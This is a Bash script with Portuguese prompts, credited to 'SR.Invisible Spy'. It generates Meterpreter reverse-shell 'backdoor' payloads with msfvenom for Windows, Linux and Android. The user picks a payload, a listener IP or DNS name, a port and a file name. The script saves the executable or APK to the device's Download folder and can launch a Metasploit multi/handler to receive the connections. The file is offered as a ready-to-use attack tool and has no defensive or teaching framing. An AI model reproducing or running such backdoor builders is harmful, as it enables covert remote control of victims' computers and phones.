#!bin/bash
#codado by:SR.Invisible Spy
#v == vermelho
#V == verde
#a == azul
#b == branco
v="\033[1;31m"
V="\033[1;32m"
a="\033[1;34m"
b="\033[1;37m"
echo $V"INICIALIZANDO... 5s"
sleep 1
clear
echo $V"INICIALIZANDO... 4s"
sleep 1
clear
echo $V"INICIALIZANDO... 3s"
sleep 1
clear
echo $V"INICIALIZANDO... 2s"
sleep 1
clear
echo $V"INICIALIZANDO... 1s"
sleep 1
clear
echo $V"INICIALIZANDO... 0s"
sleep 1
clear
echo $V"SEJA BEM VINDO"
echo
echo $a"CRIADOR: SR.Invisible Spy"
echo $a"NUMERO: +1 (210) 963-7678"
sleep 2
echo "$V  ________________________________________ "
echo "$V | _____            _      _ _     _      |"
echo "$V ||_   _|          (_)    (_) |   | |     |"
echo "$V |  | |  _ ____   ___ ___  _| |__ | | ___ |"
echo "$V |  | | | '_ \ \ / / / __|  | '_ \| |/ _ \|"
echo "$V | _| |_| | | \ V /| \__  \ | |_) | |  __/|"
echo "$V ||_____|_| |_|\_/ |_|____/_|_.__/|_|\___||"
echo "$V |                                        |"
echo "$V |             _____                      |"
echo "$V |           /  ____|                     |"
echo "$V |          |  (___  _ __  _   _          |"
echo "$V |           \___  \| '_ \| | | |         |"
echo "$V |           ____)  | |_) | |_| |         |"
echo "$V |          |______/| .__/ \__, |         |"
echo "$V |                  | |     __/ |         |"
echo "$V |                  |_|    |____/         |"
echo "$V |________________________________________|"
sleep 1
echo
echo $v"Payloads para Windows"
echo
echo $V"[1]$a windows/meterpreter/reverse_tcp"
echo
echo $V"[2]$a windows/x64/meterpreter/reverse_tcp"
echo
echo $V"[3]$a windows/meterpreter/reverse_https"
echo
echo $V"[4]$a windows/meterpreter/reverse_tcp_dns"
echo
echo $v"Payload para Linux"
echo
echo $V"[5]$a linux/x86/meterpreter/reverse_tcp"
echo
echo $v"Payloads para Android"
echo
echo $V"[6]$a android/meterpreter/reverse_tcp"
echo
echo $V"[7]$a android/meterpreter/reverse_https"
echo
echo -n $b"Escolha o numero da payload que voce deseja!\n>>> $V"
read Pa
echo
echo -n $b"Digite o IP ou DNS que vai receber a conexão:\n>>> $V"
read H
echo
echo -n $b"Digite a porta desejada para rodar o backdoor:\n>>> $V"
read P
echo
echo -n $b"Qual nome voce quer para o seu backdoor?\n>>> $V"
read B
echo
if [ "$Pa" = "1" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$H LPORT=$P -f exe > /sdcard/Download/$B.exe
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "2" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$H LPORT=$P -f exe > /sdcard/Download/$B.exe 
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "3" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p windows/meterpreter/reverse_https LHOST=$H LPORT=$P -f exe > /sdcard/Download/$B.exe
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "4" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$H LPORT=$P -f exe > /sdcard/Download/$B.exe
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "5" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$H LPORT=$P -f elf > /sdcard/Download/$B.elf
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "6" ];then
	echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$H LPORT=$P R > /sdcard/Download/$B.apk
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
if [ "$Pa" = "7" ];then
    echo $V"Gerando seu backdoor...$v\nAGUARDEM...$V"
    echo
    msfvenom -p android/meterpreter/reverse_https LHOST=$H LPORT=$P R > /sdcard/Download/$B.apk
    echo
    echo $V"Backdoor salvo em /sdcard/Download"
    echo
fi
echo -n $b"Deseja configurar o handler agora? [sim/nao]\n>>> $V"
read z
echo
if [ "$z" = "sim" ];then
    echo -n $b"Digite apenas o nome da sua payload para configurar o handler!\n>>> $V"
read w
    echo
    echo $V"INICIALIZANDO O METASPLOIT..."
    echo $v"AGUARDE...$V"
    msfconsole -q -x "use multi/handler ; set PAYLOAD $w ; set LHOST $H ; set LPORT $P ; set Exit0Session false ; exploit"
fi
if [ "$z" = "nao" ];then
    echo $V"SAINDO..."
    exit
fi
